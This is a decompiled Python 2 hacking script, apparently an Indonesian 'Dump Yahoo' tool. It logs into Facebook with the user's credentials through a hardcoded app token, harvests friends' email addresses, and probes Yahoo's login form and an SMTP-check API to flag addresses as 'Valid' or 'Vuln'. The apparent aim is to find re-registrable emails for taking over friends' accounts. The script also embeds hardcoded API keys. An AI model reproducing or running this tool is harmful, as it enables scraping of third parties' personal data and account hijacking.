# Decompiled By xNot_Found
# Github : https://github.com/hatakecnk
# uncompyle6 version 3.3.5
# Python bytecode 2.7
# Decompiled from: Python 2.7.16 (default, Jul  7 2019, 21:05:54) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <seni>
import requests, json, os, re, sys, mechanize, time, urllib
reload(sys)
br = mechanize.Browser()
br.set_handle_robots(False)
os.system('clear')
print "\x1b[93m  ____   __  __  _ ___  \n / _/ | /__\\|  \\| | __| Dump Yahoo v1 \n| \\_| || \\/ | | ' | _|  Yt : GUNAWAN ID \n \\__/___\\__/|_|\\__|___| Team : 407 AeX"
print '\x1b[0mLogin Akun Facebook'
usr = raw_input('Username: \x1b[96m')
pwd = raw_input('\x1b[0mPassword: \x1b[96m')
url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + usr + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
data = urllib.urlopen(url)
jun = json.load(data)
if 'access_token' in jun:
    toket = jun['access_token']
else:
    print '\x1b[91m[!] Login Gagal\n\x1b[91m[!] Periksa Kembali Email Dan Password \x1b[0m'
    sys.exit()
get_friends = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
hasil = json.loads(get_friends.text)
print '\x1b[0m[\x1b[32m*\x1b[0m] Crack Yahoo Teman Facebook'
time.sleep(4)

def defense():
    global h
    global o
    o = []
    h = 0
    print '[~] Daftar Cracking Yahoo: '
    for i in hasil['data']:
        h += 1
        o.append(h)
        x = requests.get('https://graph.facebook.com/' + i['id'] + '?access_token=' + toket)
        z = json.loads(x.text)
        try:
            kunci = re.compile('@.*')
            cari = kunci.search(z['email']).group()
            if 'yahoo.com' in cari:
                br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
                br._factory.is_html = True
                br.select_form(nr=0)
                br['username'] = z['email']
                j = br.submit().read()
                Jun = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
                try:
                    cd = Jun.search(j).group()
                except:
                    vuln = '\x1b[31mDie'
                    lean = 30 - len(z['email'])
                    lone = 24 - len(vuln)
                    print '\nEmail : ' + z['email'] + '\nStatus: ' + vuln + '\x1b[0m'
                    continue

                if '"messages.ERROR_INVALID_USERNAME">' in cd:
                    vuln = '\x1b[32mValid'
                else:
                    vuln = '\x1b[31mDie'
                lean = 30 - len(z['email'])
                lone = 24 - len(vuln)
                print '\nEmail : ' + z['email'] + '\nStatus: ' + vuln + '\x1b[0m'
            elif 'hotmail' in cari:
                url = 'http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=' + z['email'] + '&smtp=1&format=1'
                cek = json.loads(requests.get(url).text)
                if cek['smtp_check'] == 0:
                    vuln = '        \x1b[32mVuln'
                else:
                    vuln = '\x1b[31mDie'
                lean = 30 - len(z['email'])
                lone = 24 - len(vuln)
                print '\nEmail : ' + z['email'] + '\nStatus: ' + vuln + '\x1b[0m'
        except KeyError:
            pass


defense()